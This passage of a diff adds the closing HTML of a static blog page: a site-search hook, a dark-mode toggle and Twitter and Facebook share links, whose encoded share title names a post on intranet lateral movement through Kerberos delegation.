+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + %E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8(%E4%B9%9D)-%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%26%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE + '&url=' + http%3A%2F%2Fexample.com%2Fposts%2Ff7053583%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/posts/f7053583/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
